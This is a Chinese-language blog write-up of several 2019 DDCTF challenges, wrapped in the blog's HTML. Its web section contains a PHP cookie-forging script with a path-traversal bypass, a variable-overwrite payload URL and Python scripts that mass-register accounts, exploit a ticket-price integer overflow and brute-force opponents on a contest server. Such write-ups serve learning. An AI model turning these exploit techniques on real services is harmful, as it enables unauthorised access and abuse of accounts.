@@ -1,0 +1,588 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="author" content="G0fl1er">
+    
+    <meta name="description" content="一只想学技术的专科菜鸡">
+    
+    
+    
+    
+    
+    
+    <title>2019DDCTF部分wp | G0fl1er&#39;blog</title>
+    <link href=”https://ghostfirer.github.io“ rel=”prefetch” />
+
+    
+<link rel="stylesheet" href="/css/bootstrap.min.css">
+<link rel="stylesheet" href="/css/aos.css">
+<link rel="stylesheet" href="/css/style.css">
+
+    
+<script src="/js/jquery.min.js"></script>
+
+    
+<script src="/js/bootstrap.min.js"></script>
+
+    
+<script src="/js/aos.js"></script>
+
+    
+<script src="/js/highslide/highslide-full.min.js"></script>
+
+    
+<link rel="stylesheet" href="/js/highslide/highslide.css">
+
+    <style type="text/css">
+        @media (max-width: 768px) {
+            body {
+                background-color: #f0f0f0;
+                background: url('/imgs/timg.jpg');
+                background-attachment: fixed;
+            }
+        }
+    </style>
+    
+    <!--<script type="text/javascript">
+      if (document.images) {
+        var avatar = new Image();
+        avatar.src = '/imgs/avatar.jpg'
+        var previews = 'preview1.jpg,preview2.jpg,preview3.jpg,preview4.jpg'.split(',')
+        var previewsPreLoad = []
+        for(var i = 0; i < length; i++) {
+          previewsPreLoad.push(new Image())
+          previewsPreLoad[previewsPreLoad.length - 1].src = '/imgs/preview' + previews[i]
+        }
+      }
+    </script>-->
+<meta name="generator" content="Hexo 5.0.0"></head>
+<body>
+    <!-- 背景轮播图功能 -->
+    <section class="hidden-xs">
+    <ul class="cb-slideshow">
+        <li><span>天若</span></li>
+        <li><span>有情</span></li>
+        <li><span>天亦老</span></li>
+        <li><span>我为</span></li>
+        <li><span>长者</span></li>
+        <li><span>续一秒</span></li>
+    </ul>
+</section>
+    <!-- 欧尼酱功能, 谁用谁知道 -->
+    
+    <header class="navbar navbar-inverse" id="gal-header">
+    <div class="container">
+        <div class="navbar-header">
+            <button type="button" class="navbar-toggle collapsed"
+                    data-toggle="collapse" data-target=".bs-navbar-collapse"
+                    aria-expanded="false">
+                <span class="fa fa-lg fa-reorder"></span>
+            </button>
+            <a href="https://ghostfirer.github.io">
+                
+                <style>
+                    #gal-header .navbar-brand {
+                        height: 54px;
+                        line-height: 24px;
+                        font-size: 28px;
+                        opacity: 1;
+                        background-color: rgba(0,0,0,0);
+                        text-shadow: 0 0 5px #fff,0 0 10px #fff,0 0 15px #fff,0 0 20px #228DFF,0 0 35px #228DFF,0 0 40px #228DFF,0 0 50px #228DFF,0 0 75px #228DFF;
+                    }
+                </style>
+                <!-- 这里使用文字(navbar_text or config.title) -->
+                <div class="navbar-brand">G0fl1er&#39;blog</div>
+                
+            </a>
+        </div>
+        <div class="collapse navbar-collapse bs-navbar-collapse">
+            <ul class="nav navbar-nav" id="menu-gal">
+                
+                
+                <li class="">
+                    <a href="/">
+                        <i class="fa fa-home"></i>首页
+                    </a>
+                </li>
+                
+                
+                
+                <li class="">
+                    <a href="/archives">
+                        <i class="fa fa-archive"></i>归档
+                    </a>
+                </li>
+                
+                
+                
+                
+                <li class="">
+                    <a href="/categories">
+                        <i class="fa fa-list"></i>分类
+                    </a>
+                </li>
+                
+                
+                
+                
+                
+                <li class="dropdown">
+                    <!-- TODO 添加hover dropdown效果 -->
+                    <a href="#" class="dropdown-toggle" data-toggle="dropdown"
+                       aria-haspopup="true" aria-expanded="false" data-hover="dropdown">
+                        <i class="fa fa-tags"></i>标签
+                    </a>
+                    <ul class="dropdown-menu">
+                        
+                        
+                        <li>
+                            <a href="/tags/ctf/">ctf</a>
+                        </li>
+                        
+                        <li>
+                            <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a>
+                        </li>
+                        
+                        <li>
+                            <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">学习笔记</a>
+                        </li>
+                        
+                        
+                        
+                    </ul>
+                </li>
+                
+                
+                
+                
+                <li class="">
+                    <a href="/about/index">
+                        <i class="fa fa-user"></i>关于我
+                    </a>
+                </li>
+                
+                
+            </ul>
+        </div>
+    </div>
+</header>
+    <div id="gal-body">
+        <div class="container">
+            <div class="row">
+                <div class="col-md-8 gal-right" id="mainstay">
+                    
+<article class="article well article-body" id="article">
+    <div class="breadcrumb">
+        <i class="fa fa-home"></i>
+        <a href="https://ghostfirer.github.io">G0fl1er&#39;blog</a>
+        >
+        <span>2019DDCTF部分wp</span>
+    </div>
+    <!-- 大型设备详细文章 -->
+    <div class="hidden-xs">
+        <div class="title-article">
+            <h1>
+                <a href="/2019/04/25/2019DDCTF%E9%83%A8%E5%88%86wp/">2019DDCTF部分wp</a>
+            </h1>
+        </div>
+        <div class="tag-article">
+            
+            <span class="label label-gal">
+                <i class="fa fa-tags"></i>
+                
+                <a href="/tags/ctf/">ctf</a>
+                
+            </span>
+            
+            <span class="label label-gal">
+                <i class="fa fa-calendar"></i> 2019-04-25
+            </span>
+            
+        </div>
+    </div>
+    <!-- 小型设备详细文章 -->
+    <div class="visible-xs">
+        <center>
+            <div class="title-article">
+                <h4>
+                    <a href="/2019/04/25/2019DDCTF%E9%83%A8%E5%88%86wp/">2019DDCTF部分wp</a>
+                </h4>
+            </div>
+            <p>
+                <i class="fa fa-calendar"></i> 2019-04-25
+            </p>
+            <p>
+                
+                <i class="fa fa-tags"></i>
+                
+                <a href="/tags/ctf/">ctf</a>
+                
+                
+                
+            </p>
+        </center>
+    </div>
+    <div class="content-article">
+        <h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Web签到"><a href="#Web签到" class="headerlink" title="Web签到"></a>Web签到</h3><p>首先打开题目发现权限不够不运行，登录，试了各种伪造ip发现不行，肯定是对ID进行的验证<br><img src="1.png" alt="图片"><br>于是抓包看了下，发现了GET完页面后会主动向 /app/Auth.php发送一个POST请求<br>而且里面存在一个ddctf_username=,很显然这个是验证.<br><img src="2.png" alt="图片"><br>尝试了下admin,发现可以<br><img src="3.png" alt="图片"><br>然后按照要求进入app/fL2XID2i0Cdh.php这个页面，发现了源码<br>在Application里面：<br><img src="4.png" alt="图片"><br>可以看到他存在一个str_replace的函数来过滤上级目录的符号，但是有个缺点只能过滤一次，使用….//就可以绕过<br>app/Session.php里面是主页面，读key.txt<br><img src="5.png" alt="图片"><br>这里主要就是序列化我们的userdata在于userdata拼接了key的md5进行拼接<br><img src="6.png" alt="图片"><br>所以基本上可以知道了，需要去伪造一个userdata去读取flag.txt。根据前面的str_replace函数可以构造path为….//config/flag.txt<br>又因为上面的session_create（）所以<br>第一步先读key：<br>post:nickname=%s<br><img src="7.png" alt="图片"><br>然后读到了Key:EzblrbNS<br>其次就是根据源码来写一个php脚本来构造我们需要的ddctf_id，把我们的路径加进去</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">Class Application &#123;</span><br><span class="line">    var $path &#x3D; &#39;....&#x2F;&#x2F;config&#x2F;flag.txt&#39;;</span><br><span class="line">&#125;</span><br><span class="line">$userdata &#x3D; array(</span><br><span class="line">    &#39;session_id&#39; &#x3D;&gt; &#39;241aa2d8cbfa06531fbbf6e8ef567f3a&#39;,</span><br><span class="line">    &#39;ip_address&#39; &#x3D;&gt; &#39;223.104.2.41&#39;,</span><br><span class="line">    &#39;user_agent&#39; &#x3D;&gt; &#39;&#39;,</span><br><span class="line">    &#39;user_data&#39; &#x3D;&gt; new Application(),</span><br><span class="line">);</span><br><span class="line">$cookiedata &#x3D; serialize($userdata);</span><br><span class="line">$cookiedata &#x3D; urlencode($cookiedata) . md5(&#39;EzblrbNS&#39; .$cookiedata);</span><br><span class="line">echo $cookiedata;</span><br></pre></td></tr></table></figure>
+<p>然后利用我们构造好的ddctf_id用着访问index.php的方法去访问app/Session.php就可以成功getflag了<br><img src="8.png" alt="图片"></p>
+<h3 id="滴"><a href="#滴" class="headerlink" title="滴~"></a>滴~</h3><p>解题思路<br><a href="http://117.51.150.246/index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09">http://117.51.150.2</a><a href="http://117.51.150.246/index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09">46/ind</a><a href="http://117.51.150.246/index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09">ex.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09</a><br>后面是jpg是base64编码两次+base16编码一次<br><img src="9.pnh" alt="图片"><br> 发现是一个本地文件包含，编码index.php,拿到源码<br><img src="10.png" alt="图片"></p>
+<p>然后继续解密：<br><img src="11.png" alt="图片"><br><img src="12.png" alt="图片"><br>去这个博客，找到这篇博文<br><img src="13.png" alt="图片"><br><img src="14.png" alt="图片"><br>发现这个文件名，这个是脑洞<br><img src="15.png" alt="图片"><br>包含这个文件，解码得到了<br><img src="16.png" alt="图片"></p>
+<p><img src="17.png" alt="图片"><br>观察源码，发现过滤了非字母和数字，但是会吧config替换为!<br> 构造f1agconfigddctf.php</p>
+<p>继续包含<br><img src="18.png" alt="图片"><br>解码base64 发现了源码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include(&#39;config.php&#39;);</span><br><span class="line">$k &#x3D; &#39;hello&#39;;</span><br><span class="line">extract($_GET);</span><br><span class="line">if(isset($uid))</span><br><span class="line">&#123;</span><br><span class="line">    $content&#x3D;trim(file_get_contents($k));</span><br><span class="line">    if($uid&#x3D;&#x3D;$content)</span><br><span class="line">    &#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        echo&#39;hello&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>然后进行变量覆盖就好了</p>
+<p>构造payload:<a href="http://117.51.150.246/f1ag!ddctf.php?$k=&uid=&$content=">http://117.51.150.246/f1ag!ddctf.php?$k=&amp;uid=&amp;$content=</a></p>
+<p><img src="19.png" alt="图片"></p>
+<p>flag：DDCTF{436f6e67726174756c6174696f6e73}</p>
+<h3 id="大吉大利，今晚吃鸡"><a href="#大吉大利，今晚吃鸡" class="headerlink" title="大吉大利，今晚吃鸡~"></a>大吉大利，今晚吃鸡~</h3><p>buy_ticket这个接口可以改金额，但不能改为负数，会报错<br><img src="20.png" alt="图片"></p>
+<p><img src="21.png" alt="图片"><br>直接送一个int32_MAX+1进去，就可以溢出了，买完入场券可以入场<br><img src="22.png" alt="图片"></p>
+<p><img src="23.png" alt="图片"></p>
+<p>移除对手需要对手的id和ticket，写脚本爆破即可，在移除是的时候只有存在data的才算有效<br><img src="24.png" alt="图片"><br>附上我写的垃圾半自动脚本：</p>
+<p>注册脚本：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import json</span><br><span class="line">f &#x3D; open(&quot;.&#x2F;user.txt&quot;,&quot;w+&quot;)</span><br><span class="line">header &#x3D; &#123;&quot;User-Agent&quot;: &quot;Mozilla&#x2F;5.0 (Windows NT 10.0; WOW64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;69.0.3497.100 Safari&#x2F;537.36&quot;,&quot;Referer&quot;: &quot;http:&#x2F;&#x2F;117.51.147.155:5050&#x2F;index.html&quot;&#125;</span><br><span class="line">for i in range(1,500):</span><br><span class="line">    a &#x3D; &quot;dk601&quot;+str(i)#这个的话账号前缀差不多就行，别和别人的重复了，跑一组500个数据，中途不能断</span><br><span class="line">    b &#x3D; &quot;&quot;#密码就设置为定值就好</span><br><span class="line">    url &#x3D; &quot;http:&#x2F;&#x2F;117.51.147.155:5050&#x2F;ctf&#x2F;api&#x2F;register?password&#x3D;%s&amp;name&#x3D;%s&quot;%(b,a)</span><br><span class="line">    html &#x3D; requests.get(url,headers&#x3D;header)</span><br><span class="line">    code &#x3D; html.status_code</span><br><span class="line">    try:</span><br><span class="line">        html_parse &#x3D; json.loads(html.content)</span><br><span class="line">        code &#x3D; html_parse[&#39;code&#39;]</span><br><span class="line">        if code&#x3D;&#x3D;404:</span><br><span class="line">            print(&quot;user:%s成功保存&quot;%a)</span><br><span class="line">            f.write(a)</span><br><span class="line">            f.write(&#39;\n&#39;)</span><br><span class="line">    except:</span><br><span class="line">        continue</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">获得注册用户的每个id和ticket:</span><br><span class="line">#coding&#x3D;utf-8</span><br><span class="line">import requests</span><br><span class="line">import json</span><br><span class="line">f &#x3D; open(&quot;.&#x2F;data.txt&quot;,&quot;w+&quot;)</span><br><span class="line">b &#x3D; open(&quot;.&#x2F;user.txt&quot;,&quot;r&quot;)</span><br><span class="line">passwd &#x3D; &quot;&quot;#填写你的密码</span><br><span class="line">for i in b.readlines():</span><br><span class="line">    m &#x3D; i.replace(&quot;\n&quot;,&quot;&quot;)</span><br><span class="line">    url &#x3D;&quot;http:&#x2F;&#x2F;117.51.147.155:5050&#x2F;ctf&#x2F;api&#x2F;login?name&#x3D;%s&amp;password&#x3D;%s&quot;%(m,passwd)</span><br><span class="line">    header &#x3D; &#123;&quot;User-Agent&quot;: &quot;Mozilla&#x2F;5.0 (Windows NT 10.0; WOW64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;69.0.3497.100 Safari&#x2F;537.36&quot;,&quot;Referer&quot;: &quot;http:&#x2F;&#x2F;117.51.147.155:5050&#x2F;index.html&quot;&#125;</span><br><span class="line">    Session &#x3D; requests.session()</span><br><span class="line">    html &#x3D; Session.get(url,headers&#x3D;header)</span><br><span class="line">    url_index &#x3D; &quot;http:&#x2F;&#x2F;117.51.147.155:5050&#x2F;ctf&#x2F;api&#x2F;buy_ticket?ticket_price&#x3D;4294967299&quot;</span><br><span class="line">    html_index &#x3D; Session.get(url_index)</span><br><span class="line">    bill_id_url &#x3D; &quot;http:&#x2F;&#x2F;117.51.147.155:5050&#x2F;ctf&#x2F;api&#x2F;get_user_balance&quot;</span><br><span class="line">    html_bill_id &#x3D; Session.get(bill_id_url)</span><br><span class="line">    try:</span><br><span class="line">        bill_id_json &#x3D; json.loads(html_bill_id.text)</span><br><span class="line">        bill_id &#x3D; bill_id_json[&quot;data&quot;][0][&quot;bill_id&quot;]</span><br><span class="line">        pay_url &#x3D; &quot;http:&#x2F;&#x2F;117.51.147.155:5050&#x2F;ctf&#x2F;api&#x2F;pay_ticket?bill_id&#x3D;%s&quot;%bill_id</span><br><span class="line">        pay_html &#x3D; Session.get(pay_url)</span><br><span class="line">        data &#x3D; json.loads(pay_html.text)</span><br><span class="line">        your_id &#x3D; data[&quot;data&quot;][0][&quot;your_id&quot;]</span><br><span class="line">        your_ticket &#x3D; data[&quot;data&quot;][0][&quot;your_ticket&quot;]</span><br><span class="line">        f.write(str(your_id))</span><br><span class="line">        f.write(&quot; &quot;)</span><br><span class="line">        f.write(str(your_ticket))</span><br><span class="line">        f.write(&#39;\n&#39;)</span><br><span class="line">        print(&quot;user:%s成功保存&quot; % m)</span><br><span class="line">    except:</span><br><span class="line">        print(&quot;user:%s有问题&quot;%m)</span><br><span class="line">        continue</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">提交移除对手的id和ticket:</span><br><span class="line">import requests</span><br><span class="line">f &#x3D; open(&quot;.&#x2F;data.txt&quot;,&quot;r&quot;)</span><br><span class="line">username&#x3D;&quot;&quot;</span><br><span class="line">passwd&#x3D;&quot;&quot;</span><br><span class="line">url &#x3D;&quot;http:&#x2F;&#x2F;117.51.147.155:5050&#x2F;ctf&#x2F;api&#x2F;login?name&#x3D;%s&amp;password&#x3D;%passwd&quot;%(username,passwd)</span><br><span class="line">header &#x3D; &#123;&quot;User-Agent&quot;: &quot;Mozilla&#x2F;5.0 (Windows NT 10.0; WOW64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;69.0.3497.100 Safari&#x2F;537.36&quot;,&quot;Referer&quot;: &quot;http:&#x2F;&#x2F;117.51.147.155:5050&#x2F;index.html&quot;&#125;</span><br><span class="line">game_url &#x3D; &quot;http:&#x2F;&#x2F;117.51.147.155:5050&#x2F;index.html#&#x2F;main&#x2F;result&quot;</span><br><span class="line">Session &#x3D; requests.session()</span><br><span class="line">for line in f.readlines():</span><br><span class="line">    user_id,ticket&#x3D;line.split(&#39; &#39;)</span><br><span class="line">    ticket&#x3D;ticket.replace(&quot;\n&quot;,&quot;&quot;)</span><br><span class="line">    shutdown_url &#x3D; &quot;http:&#x2F;&#x2F;117.51.147.155:5050&#x2F;ctf&#x2F;api&#x2F;remove_robot?id&#x3D;%s&amp;ticket&#x3D;%s&quot;%(user_id, ticket)</span><br><span class="line">    html &#x3D; Session.get(url,headers&#x3D;header)</span><br><span class="line">    shutdown_html &#x3D; Session.get(shutdown_url)</span><br><span class="line">    print(shutdown_html.content)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<hr>
+<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="wireshark"><a href="#wireshark" class="headerlink" title="wireshark"></a>wireshark</h3><p>解题思路<br>打开wireshark以后，用wireshark打开以后导出http的包以后<br><img src="25.png" alt="图片"><br>看到有1个图片已经出来的，其次就是找找这些数据里面的图片，将他们提取出来<br>其中发现%5c(1)存在一张和%5c(4)存在一张，提取完毕以后是这样的。<br><img src="26.png" alt="图片"><br>然后修改下钥匙图形的高宽可以看到隐藏的信息<br> <img src="27.png" alt="图片"><br>其次可以观察到%5c(4)和fd开头的那个图片长得一样，但是看大小和详细信息，可以知道fd是压缩过的%5c(4)，所以只需要从%5c(4)上下手就可以了。<br>用在线工具：<a href="http://tools.jb51.net/aideddesign/img_add_info">http://tools.jb51.net/aideddesign/img_add_info</a><br>直接进去输入图片和key就可以解出密文了<br><img src="28.png" alt="图片"><br>然后可以看到44开头就是DD的意思，很显然这个就是flag了。用随便什么方法去转换一下就OK<br>flag:DDCTF{QEWokcpHeUo2WOfBIN7pogIWsF04iRjt}<br>注意的地方：这里在用在线工具提取的时候，需要注意浏览器。</p>
+<hr>
+<h3 id="MulTzor"><a href="#MulTzor" class="headerlink" title="MulTzor"></a>MulTzor</h3><p>原文为英语，请破解</p>
+<p>014e084dda666a631b58d361627e5a5bcc327f651f14ef7c626a17558a71627d1251d87b656a5a47d3617f681714cf7c6a6f1651ce327f651f14dd7778791f46c4324a61165dcf612b641414fd7d79611e14fd73792d337d8a66642d0851cb762b7e0f56d9666a630e5dcb7e2b6c175bdf7c7f7e5a5bcc3246620847cf3f68621e51ce32796c1e5dc53268621759df7c626e1b40c37d657e5a5bcc327f651f14eb6a627e5a44c5656e7f0914de7a6a795a5ccb762b6f1f51c4326e63195dda7a6e7f1f508a67786414538a5765641d59cb32666c195cc37c6e7e5414fe7a627e5a4dc37767691f508a7f62611340cb60722d135ade7767611353cf7c68685a43c27b68655614cb7e64631d14dd7b7f655a40c2737f2d1c46c57f2b620e5ccf602b691f57d86b7b791f508a5373640914d8736f641514cb7c6f2d0e51c6777b7f135ade77792d0e46cb7c78601347d97b646309188a656a7e5a53c3646e635a40c2772b6e1550cf7c6a601f14ff7e7f7f1b1a8a4663640914dd73782d195bc46162691f46cf762b6f0314dd7778791f46c43258780a46cf7f6e2d3b58c67b6e695a77c57f666c1450cf602b490d5dcd7a7f2d3e1a8a57627e1f5ac27d7c680814de7d2b651b42cf3269681f5a8a306f68195dd97b7d685814de7d2b7912518a5367611351ce327d641940c5607223703efe7a6e2d3f5ac375666c5a59cb7163641451d9327c6808518a732b6b1b59c37e722d15528a62647f0e55c87e6e2d195dda7a6e7f5a59cb7163641451d9327c640e5c8a60647915468a61687f1b59c87e6e7f091a8a5564621e14c5626e7f1b40c37c6c2d0a46c5716e690f46cf61272d0a46c5626e7f164d8a77656b1546c9776f215a43c56767695a5ccb646e2d1755ce772b7912518a6267781d56c57379695a71c47b6c601b14c7736865135acf327e631846cf73606c1858cf3c2b451543cf646e7f5614c77d78795a5bcc327f651f14ed7779601b5a8a7f62611340cb60722d1c5bd8716e7e5614d977687f1f408a616e7f0c5dc977782d1b5ace3268640c5dc67b6a635a55cd77656e1351d9327f651b408a6778681e14ef7c626a17558a77667d165bd3776f2d0a5bc5602b620a51d8737f6414538a6279621951ce67796809188a7365695a5dde327c6c0914de7a6e7e1f14da7d647f5a44d87d68681e41d877782d0e5ccb662b6c1658c5656e695a40c2772b48145dcd7f6a2d1755c97a62631f478a66642d18518a606e7b1f46d97726681453c37c6e680851ce326a631e14de7a6e2d195dda7a6e7f0914de7d2b6f1f14d8776a69543ea04663685a73cf60666c1414da7e7e6a185bcb606f201f45df7b7b7d1f508a5765641d59cb3269681955c7772b431b4ec3324c680859cb7c722a0914da606263195dda73672d1946d3627f625747d3617f68171a8a5b7f2d0d55d932697f155fcf7c2b6f0314de7a6e2d2a5bc67b78655a73cf7c6e7f1b588a417f6c1c528d612b4e1344c277792d3841d8776a785a5dc4324f681951c7706e7f5a05932139215a43c366632d0e5ccf326a641e14c5742b4b0851c47163200941da6267641f508a7b65791f58c67b6c681457cf32666c0e51d87b6a615a5bc8666a641451ce326d7f15598a732b4a1f46c773652d0944d33c2b4c5a59c57c7f655a56cf74647f1f14de7a6e2d1541de7079681b5f8a7d6d2d2d5bd87e6f2d2d55d83242445614cb662b6c5a57c57c6d680851c4716e2d1251c6762b631f55d8325c6c0847cb65272d0e5ccf325b62165dd97a2b4e1344c277792d3841d8776a785a47c27379681e14c366782d3f5ac375666c5756d8776a66135acd327f68195cc47b7a781f478a7365695a40cf7163631558c575722d0d5dde7a2b7912518a5479681457c2326a631e14e86062791347c23c2b490f46c37c6c2d0e5ccf324c680859cb7c2b641442cb6162621414c5742b5d1558cb7c6f215a57c5606e2d2a5bc67b78655a77c36263680814e86779681b418a626e7f095bc47c6e615a43cf606e2d1f42cb717e6c0e51ce3e2b7b13558a4064601b5ac373272d0e5b8a54796c1457cf327c651f46cf327f651f4d8a7778791b56c67b78651f508a6663685a64e932497f0f5ac53278641d5acb7e782d135ade7767611353cf7c68685a47de737f64155a8a6562791214ec606e63195c8a746a6e1358c36662680914d9677b7d1546de3c2b5e0f57c977787e1c41c63268621544cf606a79135bc4326a60155acd327f651f14fa7d676809188a6663685a72d877656e12188a7365695a40c2772b4f085dde7b78655a55de3249611f40c97a67680314fa7379665a57c57c7f641441cf762b781440c37e2b470f5acf323a344e0486327c651f5a8a54796c1457cf3278780846cf7c6f680851ce327f625a40c2772b4a1f46c773657e543ea05479621714de7a627e5a56cf756263145dc475272d0e5ccf32497f1340c361632d3d5bdc7779631751c4662b4e1550cf326a631e14e96b7b651f468a416865155bc632234a3912e941222d1b408a5067680e57c27e6e745a64cb60602d1841c37e7f2d0f448a73652d1f4cde77657e1342cf32687f0344de73656c164dde7b682d1955da736964165dde6b252d335ac366626c1658d33e2b7912518a766e6e084dda6662621414dd73782d1755c37c67745a5bcc3247781c40dd736d6b1f1482556e7f1755c4326a640814cc7d796e1f1d8a7365695a558a746e7a5a7ccf77792d5273cf60666c1414cb6066745314c777787e1b53cf61272d1b478a6663685a7fd87b6e6a0959cb6062631f1482556e7f1755c432656c0c4d83326e600a58c56b6e695a59df71632d175bd8772b7e1f57df606e2d0a46c5716e690f46cf612b6b15468a67786414538a5765641d59cb3c2b4c1655c4325f78085dc475272d1b14e973666f085dce756e2d2f5ac3646e7f095dde6b2b601b40c277666c0e5dc97b6a635a55c4762b611553c371626c14188a6279620c5dce776f2d1741c97a2b621c14de7a6e2d1546c37562631b588a666364145fc37c6c2d0e5ccb662b611f508a66642d0e5ccf326f68095dcd7c2b621c14de7a6e2d1946d3627f6c1455c66b7f641955c63269621756cf32666c195cc37c6e7e5a40c2737f2d0d51d8772b641447de607e601f5ade73672d135a8a777d681440df7367610314c8606e6c115dc4752b7912518a7c6a7b1b588a5765641d59cb3c2b451543cf646e7f5614de7a6e2d3146c3776c7e1755d87b65685a5dc46679621e41c9776f2d1b5a8a5765641d59cb327d680847c37d652d0d5dde7a2b6c5a52c56779791214d87d7f620814cc7d792d1340d9325e20185bcb6678215a46cf617e610e5dc4752b641414cb327b7f1558c57c6c681e14da77796415508a6563681414de7a6e7e1f14c777787e1b53cf612b6e1541c6762b6315408a706e2d1e51c960727d0e51ce3c2b5a1340c2327f651f14c9737b790f46cf32646b5a46cf7e6e7b1b5ade3268640a5ccf602b661f4dd9326a631e14de7a6e2d0f47cf32646b5a59df71632d1c55d9666e7f5a61f932456c0c4d8a7064601851d93e2b7f1f53df7e6a7f5614d8737b641e14d8776a69135acd32646b5a618770646c0e14c777787e1b53cf612b7f1f47df7f6e69543ea04663685a52c6736c2d134790324f493960ec693b3a1805c8263d694b50c82033354e07ce236d694d02922a326b1f559370383b07</p>
+<p>试了各种编码方式，最后在<a href="https://github.com/zardus/ctf-tools">https://github.com/zardus/ctf-tools</a> 看到了xortool，于是用这个工具进行破解:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xortool -x -b misc3.txt</span><br></pre></td></tr></table></figure>
+<p>查看<strong>filename-char_used-perc_valid.csv</strong>文件，过滤出perc_valid=100的文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">xortool_out&#x2F;064.out;32;100.0</span><br><span class="line">xortool_out&#x2F;066.out;33;100.0</span><br><span class="line">xortool_out&#x2F;068.out;34;100.0</span><br><span class="line">xortool_out&#x2F;070.out;35;100.0</span><br><span class="line">xortool_out&#x2F;072.out;36;100.0</span><br><span class="line">xortool_out&#x2F;074.out;37;100.0</span><br><span class="line">xortool_out&#x2F;078.out;39;100.0</span><br><span class="line">xortool_out&#x2F;092.out;46;100.0</span><br><span class="line">xortool_out&#x2F;100.o</span><br><span class="line">xortool_out&#x2F;106.out;53;100.0</span><br><span class="line">xortool_out&#x2F;126.out;63;100.0</span><br><span class="line">xortool_out&#x2F;200.out;100;9</span><br><span class="line">xortool_out&#x2F;201.out;100;9</span><br></pre></td></tr></table></figure>
+<p>一个一个看，发现flag在064.out里。<br><img src="29.png" alt="图片"><br>查看<strong>filename-key.csv</strong>,可以看到爆破出的key为** \x0b\rz4\xaa\x12**</p>
+<p>但是有朋友的密文这样做会出现乱码，那是因为我们爆破出来的key部分有问题，需要手动更正，然后去跑脚本就可以出<br><img src="41.png" alt="enter description here"><br>比如这样的情况下我出来的key里面的头不对<br><img src="43.png" alt="enter description here"><br>就必须手动更正一下然后跑脚本<br><img src="42.png" alt="enter description here"></p>
